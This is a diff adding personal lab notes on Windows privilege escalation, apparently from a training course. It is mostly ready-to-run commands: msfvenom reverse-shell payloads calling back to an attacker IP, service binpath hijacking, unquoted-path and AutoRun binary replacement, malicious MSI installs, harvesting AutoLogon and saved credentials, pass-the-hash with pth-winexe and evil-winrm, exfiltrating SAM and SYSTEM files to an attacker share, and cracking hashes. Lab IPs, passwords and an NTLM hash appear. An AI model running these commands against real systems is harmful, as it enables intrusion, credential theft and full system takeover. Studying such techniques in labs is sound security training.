@@ -1,0 +1,331 @@
+windows privilege escalation :-
+
+
+@to get rdp or virtual desktop use this command :- xfreerdp /u:user /p:password321 /cert:ignore /v:10.48.157.34
+
+@ it is used to make exploit :- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+
+@This will show the configuration details of a service :- sc qc <servicename>
+
+@use this command to change the file path of service which has all changes/misconfigraations and run  :- sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+
+@ to run use this:-  net start daclsvc
+
+
+
+# Steps to Hijack a Service for Privilege Escalation
+
+
+1. List all services:
+   sc query
+
+
+1. Check service configuration:
+   sc qc <servicename>
+   -> Look for: SERVICE_START_NAME : LocalSystem
+
+2. Verify user permissions:
+   accesschk.exe /accepteula -uwcqv user <servicename>
+   -> Look for: SERVICE_CHANGE_CONFIG (means user can reconfigure)
+
+
+3. Change the service binary path:
+   sc config <servicename> binpath= "C:\PrivEsc\reverse.exe"
+
+4. Confirm the change:
+   sc qc <servicename>
+   -> BINARY_PATH_NAME should now point to C:\PrivEsc\reverse.exe
+
+5. Start a listener on Kali:
+   sudo nc -nvlp <port>
+
+6. Start the service on Windows:
+   net start <servicename>
+
+# Result:
+- If successful, the service (running as SYSTEM) executes reverse.exe
+- Your reverse shell connects back with SYSTEM privileges
+
+
+
+
+
+
+
+# Service Exploits – Key Differences
+
+## 1. Insecure Service Permissions (daclsvc example)
+- Weakness: Service permissions (DACL) allow low-privileged user to reconfigure.
+- Steps:
+  C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+  sc qc daclsvc   -> check SERVICE_START_NAME : LocalSystem
+  sc config daclsvc binpath= "C:\PrivEsc\reverse.exe"
+  net start daclsvc
+- Result: Reverse shell runs as SYSTEM because you changed the service config.
+
+## 2. Unquoted Service Path (unquotedsvc example)
+- Weakness: Service binary path is unquoted and contains spaces; directory is writable.
+- Steps:
+  sc qc unquotedsvc   -> check SERVICE_START_NAME : LocalSystem
+  C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+  copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+  net start unquotedsvc
+- Result: Reverse shell runs as SYSTEM because Windows misinterprets the unquoted path and executes your payload.
+
+## Difference in One Line:
+- Insecure Service Permissions = exploit weak **permissions** to reconfigure the service.
+- Unquoted Service Path = exploit weak **path parsing** by dropping a malicious file in a writable directory.
+
+# Both techniques lead to SYSTEM-level shells, but target different misconfigurations.
+
+
+
+
+
+# Registry Exploits – AutoRuns
+
+1. Query AutoRun executables in registry:
+   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+2. Check permissions on an AutoRun executable:
+   C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+   -> Look for write access by Everyone or Users group
+
+3. Overwrite the AutoRun executable with your payload:
+   copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+4. Start a listener on Kali:
+   sudo nc -nvlp <port>
+
+5. Restart the Windows VM:
+   - AutoRun program executes at login
+   - If payload doesn’t fire automatically, log in as admin (admin/password123) to trigger it
+
+# Result:
+- Reverse shell connects back with admin privileges
+- In real-world scenarios, you must wait for an administrator to log in naturally
+
+# Key Point:
+- AutoRun registry keys launch executables at user login
+- If those executables are writable, you can replace them with a malicious payload
+- Escalation occurs when an admin logs in and your payload runs with their privileges
+
+
+
+
+
+
+
+# Registry Exploits – AlwaysInstallElevated
+
+1. Query registry keys:
+   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+2. Check values:
+   -> Both keys must be set to 1 (0x1)
+   -> This means any user can run MSI installers with elevated privileges
+
+3. Generate malicious MSI payload on Kali:
+   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_Kali_IP> LPORT=<Port> -f msi -o reverse.msi
+
+4. Transfer payload to Windows:
+   copy \\<Kali_IP>\kali\reverse.msi C:\PrivEsc\reverse.msi
+
+5. Start listener on Kali:
+   sudo nc -nvlp <port>
+
+6. Run installer on Windows:
+   msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+# Result:
+- Reverse shell connects back with SYSTEM privileges
+- Exploit works because AlwaysInstallElevated allows MSI packages to run elevated for all users
+
+# Key Point:
+- Misconfiguration: Both HKCU and HKLM AlwaysInstallElevated keys set to 1
+- Any user can escalate privileges by running a malicious MSI installer
+
+
+
+
+
+
+
+
+
+
+
+
+# Registry Exploits – AutoLogon Passwords
+
+1. Search registry for password strings:
+   reg query HKLM /f password /t REG_SZ /s
+   -> Often noisy, shows system components (ignore)
+
+2. Query specific AutoLogon key:
+   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+3. Look for fields:
+   DefaultUserName   -> usually "admin"
+   DefaultPassword   -> plaintext password (if present)
+   AutoAdminLogon    -> should be set to 1 if enabled
+
+4. If DefaultPassword is missing:
+   -> In lab use fallback password: password123
+
+5. Use credentials with winexe from Kali:
+   winexe -U 'admin%<password>' //10.49.175.152 cmd.exe
+
+# Result:
+- Spawns a command prompt with admin privileges
+- Exploit works because AutoLogon stores plaintext credentials in registry
+
+# Key Point:
+- Misconfiguration: AutoLogon enabled with stored plaintext password
+- Any user who can read registry can harvest credentials and escalate
+
+
+
+
+
+
+
+# Password Exploits – Saved Credentials
+
+1. List saved credentials:
+   cmdkey /list
+   -> Look for saved creds for "admin"
+
+2. If no credentials are listed:
+   -> Run helper script to refresh creds:
+      C:\PrivEsc\savecred.bat
+
+3. Start listener on Kali:
+   sudo nc -nvlp <port>
+
+4. Run payload using saved creds:
+   runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+# Result:
+- Reverse shell connects back with admin privileges
+- Exploit works because Windows allows re-use of saved credentials with runas /savecred
+
+# Key Point:
+- Misconfiguration: Admin credentials saved locally
+- Any user can leverage runas /savecred to execute payloads as admin without knowing the password
+
+
+
+
+
+# Pass-the-Hash Notes (Windows + Kali)
+
+## Hash Dump Format
+username : RID : LM hash : NTLM hash : extra
+
+- Username → account name (e.g., admin)
+- RID → relative identifier (e.g., 1001)
+- LM hash → legacy hash (often disabled, placeholder aad3b435b51404eeaad3b435b51404ee)
+- NTLM hash → actual password hash (used for authentication)
+- Extra fields → not needed
+
+## Example Hash
+admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+
+- LM → aad3b435b51404eeaad3b435b51404ee
+- NTLM → a9fdfa038c4b75ebc76dc855dd74f0da
+- Full hash → aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da
+
+## Pass-the-Hash with pth-winexe
+Syntax:
+pth-winexe -U 'username%LM:NTLM' //<target_ip> cmd.exe
+
+Example:
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.48.173.229 cmd.exe
+
+- -U 'admin%LM:NTLM' → supply full hash pair
+- //<target_ip> → target Windows IP
+- cmd.exe → spawn remote shell
+
+## Key Points
+- Always include LM:NTLM together, even if LM is disabled
+- Ports 445/139 (SMB) must be open on the target
+- Account must have remote login rights
+- If successful → you get a remote cmd.exe shell as admin
+
+## Alternatives
+evil-winrm (WinRM service):
+evil-winrm -i 10.48.173.229 -u admin -H a9fdfa038c4b75ebc76dc855dd74f0da
+
+- Often more reliable in labs/exams when WinRM is enabled
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Passwords - Security Account Manager (SAM)
+
+## Location of SAM & SYSTEM Files
+- Windows stores user password hashes in the SAM file.
+- The SYSTEM file is needed to extract the boot key.
+- Insecure backups may be found in:
+  C:\Windows\Repair\
+
+## Transfer Files to Kali
+copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+
+## Dump Hashes on Kali
+# Clone updated creddump7 (default Kali version is outdated)
+git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+
+# Extract hashes
+python3 creddump7/pwdump.py SYSTEM SAM
+
+## Crack NTLM Hash with Hashcat
+# Mode 1000 = NTLM
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+## Use Cracked Password
+- Once cracked, you can log in as admin using:
+  - winexe:
+    winexe -U 'admin%password' //target_ip cmd.exe
+  - RDP:
+    xfreerdp /u:admin /p:password /v:target_ip /cert-ignore
+
+
+
+
+
+
+========automete tools==============================
+
+
+Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:
+
+winPEASany.exe
+
+Seatbelt.exe
+
+PowerUp.ps1
+
+SharpUp.exe
+
+
+
+
+
+
+
+
